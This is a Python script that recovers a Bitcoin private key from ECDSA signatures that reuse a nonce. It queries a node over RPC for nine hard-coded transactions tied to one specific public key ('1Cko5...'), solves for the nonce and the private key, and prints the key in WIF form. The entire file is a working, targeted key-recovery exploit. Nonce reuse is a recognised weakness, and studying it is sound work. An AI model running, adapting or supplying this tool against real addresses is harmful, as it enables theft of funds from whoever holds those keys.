#!/usr/bin/env python3
"""
solver_works.py

This is the definitive, targeted solver for the 1Cko5... vulnerability.
It corrects the fatal 'from_hex' AttributeError by using the proper
deserialization method from the python-bitcoinlib library.
"""

import os
import sys
import hashlib
import requests
from collections import defaultdict

# Dependencies
from bitcoin.core import CTransaction, x
from bitcoin.core.script import CScript, SignatureHash

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# --- Utilities ---
def modinv(a:int,n:int=SECP256K1_N)->int: return pow(a%n,n-2,n)
def int_from_be(b:bytes)->int: return int.from_bytes(b,"big")
def sha256(b:bytes)->bytes: return hashlib.sha256(b).digest()
def parse_der_signature(sig:bytes):
    if len(sig)<8 or sig[0]!=0x30: raise ValueError("Bad DER")
    i=2; r_len=sig[i+1]; i+=2; r=int_from_be(sig[i:i+r_len]); i+=r_len
    i+=1; s_len=sig[i+1]; i+=1; s=int_from_be(sig[i:i+s_len])
    return r,s
def privkey_to_wif(d:int)->str:
    a=b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    p=b'\x80'+d.to_bytes(32,'big')+b'\x01'; c=sha256(sha256(p))[:4]
    n=int.from_bytes(p+c,'big'); o=bytearray()
    while n>0: n,rem=divmod(n,58); o.append(a[rem])
    pad=len(p+c)-len((p+c).lstrip(b'\0')); return (a[0:1]*pad+o[::-1]).decode()

# --- BitcoinRPC Class ---
class BitcoinRPC:
    def __init__(self,url:str,user,pwd):
        self.url=url; self.session=requests.Session(); self.auth=(user,pwd)
    def getrawtransaction(self,txid:str,verbose:bool=True):
        payload={"jsonrpc":"1.0","id":"solve","method":"getrawtransaction","params":[txid,int(verbose)]}
        r=self.session.post(self.url,json=payload,auth=self.auth)
        r.raise_for_status(); return r.json()['result']

# --- Main Solver Logic ---
def main():
    print("--- Definitive Solver for 1Cko5... (Corrected Logic) ---")
    
    RPC_URL = os.environ.get("RPC_URL")
    RPC_USER = os.environ.get("RPC_USER")
    RPC_PASS = os.environ.get("RPC_PASSWORD")
    
    if not RPC_URL:
        print("Fatal: Please set your RPC environment variables.", file=sys.stderr)
        sys.exit(1)

    VULNERABLE_PUBKEY_HEX = "02ac097400a05cf0098c2c456a995db8d216681894586b6d0262e0151e3283e7db"
    TX_HASHES = [
        "9cdd4019fdb76f98a2c62ac8a981513173921453ebaf78ee1bc7ee3a64a313fb",
        "274de3f649ba434f874ab01ffb324e74b885eb13b3fddaf1d37d82ef9737528c",
        "3b4ace50fdbdf0e0e18fac3becbcdb7d43cf1d50422a892a09d1b15791e77a01",
        "ef7e210ef964889b815bc430b8cc65deba7d8e912b5bbaaeca45b48e65b86a5f",
        "f4a97da70b7a2c3ad765b59c82704721cd2c738616d578a81b027cd464b79b47",
        "49154fb5409008285660198ce30846d343bf74a87fef37edc70cf36c5331eabe",
        "491e8c77fea0a15000d25aefcd851e7c0de007f9145e46a59d4fdeab0621162e",
        "02f2af253eb98cc86f5b456fa07892e5a41a7a12a3312bd2922f68271e48aab7",
        "f7830f70915251d573c5e8a78b5b4caf7a805aa93f8b910d9e46afd220e3f659",
    ]
    
    rpc = BitcoinRPC(RPC_URL, RPC_USER, RPC_PASS)
    signatures = {} # { r_value -> (s, z, txid) }

    print(f"Analyzing {len(TX_HASHES)} transactions...")

    for txid in TX_HASHES:
        try:
            tx_verbose = rpc.getrawtransaction(txid, True)
            tx_hex = rpc.getrawtransaction(txid, False)
            
            for i, vin in enumerate(tx_verbose['vin']):
                script_pushes = list(CScript(bytes.fromhex(vin['scriptSig']['hex'])))
                if len(script_pushes) != 2: continue
                
                sig_with_sht, pub_bytes = script_pushes
                if pub_bytes.hex() == VULNERABLE_PUBKEY_HEX:
                    print(f"  Found signature in TX {txid[:10]}...")
                    
                    parent_txid = vin['txid']
                    parent_vout_n = vin['vout']
                    
                    parent_tx_verbose = rpc.getrawtransaction(parent_txid, True)
                    script_pub_key_hex = parent_tx_verbose['vout'][parent_vout_n]['scriptPubKey']['hex']
                    
                    # --- CORRECTED LINE ---
                    tx_obj = CTransaction.deserialize(x(tx_hex))
                    # ---
                    
                    script_code = CScript(bytes.fromhex(script_pub_key_hex))
                    sighash_type = sig_with_sht[-1]
                    z_hash = SignatureHash(script_code, tx_obj, i, sighash_type)
                    z = int_from_be(z_hash)
                    
                    r, s = parse_der_signature(sig_with_sht[:-1])
                    
                    if r in signatures:
                        print("\n!!! R-VALUE REUSE DETECTED !!!")
                        s1, z1, txid1 = signatures[r]
                        s2, z2, txid2 = s, z, txid
                        
                        print(f"  TX 1: {txid1}")
                        print(f"  TX 2: {txid2}")
                        print(f"  Reused R: {hex(r)}")

                        k_num = (z1 - z2) % SECP256K1_N
                        k_den = modinv((s1 - s2) % SECP256K1_N)
                        k = (k_num * k_den) % SECP256K1_N
                        
                        priv_num = (s1 * k - z1) % SECP256K1_N
                        priv_den = modinv(r)
                        private_key_int = (priv_num * priv_den) % SECP256K1_N
                        
                        print("\n--- PRIVATE KEY RECOVERED ---")
                        print(f"  Integer: {private_key_int}")
                        print(f"  WIF: {privkey_to_wif(private_key_int)}")
                        return
                    
                    signatures[r] = (s, z, txid)

        except Exception as e:
            print(f"  Error processing transaction {txid[:10]}: {e}")

    print("\nAnalysis complete. No R-value reuse found.")

if __name__ == "__main__":
    main()